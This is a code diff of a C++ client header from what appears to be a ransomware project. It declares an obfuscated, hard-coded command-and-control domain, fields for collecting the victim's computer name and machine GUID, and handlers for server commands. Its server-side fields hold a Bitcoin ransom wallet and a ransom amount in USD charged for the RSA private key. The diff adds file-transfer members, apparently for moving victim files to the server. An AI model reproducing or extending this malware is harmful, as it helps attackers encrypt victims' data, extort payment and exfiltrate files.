@@ -2,12 +2,13 @@
 
 #include "ProcessManager.h"
 #include "NetworkTypes.h"
-#include "External/base64.h"
-#include "External/obfuscate.h"
+#include "ext/base64.h"
+#include "ext/obfuscate.h"
 #include "NetworkManager.h"
+#include "FileManager.h"
 
 constexpr unsigned int UDP_PORT = 0x154E;
-const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
+const std::string      DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
 
 // info for receiving a command from the server
 // inspect the 'Packet' and construct a 'CommandDescription'
@@ -35,7 +36,6 @@ public:
     void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
     void               SetAESKey(BYTESTRING& key) { this->m_AESKey = key; }
-
 private:
     std::string        m_ComputerName   = "";       // remote host computer name. e.g DESKTOP-AJDU31S
     std::string        m_MachineGUID    = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
@@ -50,13 +50,12 @@ public:
     ~Client();
 
     bool               Connect();                   // Connect to the tcp server
-    bool               Disconnect();  // Disconnect from the tcp server
+    bool               Disconnect();                // Disconnect from the tcp server
     bool               SendMessageToServer(Server& dest, Packet message);
     bool               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     void               ListenForServerCommands();   // listen for commands from the server and perform them
-    BOOL               PerformCommand(const Packet& command, Packet& outResponse); // Perform a command from the tcp server
+    bool               PerformCommand(const Packet& command, Packet& outResponse); // Perform a command from the tcp server
     const CMDDESC      CreateCommandDescription(const Packet& command);
-
 private:
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
@@ -71,25 +70,28 @@ private:
     RSA*               m_ServerPublicKey  = {};
     SOCKET             m_UDPSocket        = INVALID_SOCKET;
     NetworkManager     m_NetworkManager   = {};
+    FileManager        m_FileManager;
 
-#elif defined(SERVER_RELEASE)                       // Server only client implementation
+#elif defined(SERVER_RELEASE)                             // Server only client implementation
 public:
     Client() = default;
     Client(SOCKET tcp, sockaddr_in addr);
 
-    void               Disconnect();                // clean up and close sockets. free bio* secrets
+    void               Disconnect();                      // clean up and close sockets. free bio* secrets
     const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
     const SOCKET       GetSocket()                 const { return this->m_TCPSocket; }
     const RSAKeys&     GetRequestSecrets()         const { return this->m_RequestSecrets; }
 
-    std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
-    long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
-    long               ClientUID        = -1;       // unique client id for the server
-    sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
-    BOOL               Alive            = TRUE;
-    RSA*               ClientPublicKey  = {};
-    BOOL               ExpectingResponse = FALSE; 
-    BOOL               KeepAliveProcess  = FALSE;
-    BOOL               KeepAliveSuccess = FALSE;
+    std::string        UniqueBTCWalletAddress;            // Wallet address to send ransom money to
+    long               RansomAmountUSD        = 0;        // amount the client must pay for rsa private key in usd
+    long               ClientUID              = -1;       // unique client id for the server
+    sockaddr_in        AddressInfo            = {};       // Address info for the eserver to send messages over udp 
+    BOOL               Alive                  = TRUE;
+    RSA*               ClientPublicKey        = {};
+    bool               FileTransferInProgress = false;    // set to true when client is processing a file to send to server
+    BOOL               ExpectingResponse      = FALSE; 
+    BOOL               KeepAliveProcess       = FALSE;
+    BOOL               KeepAliveSuccess       = FALSE;
+    int                State = 0; // reserved for future use
 #endif
 };
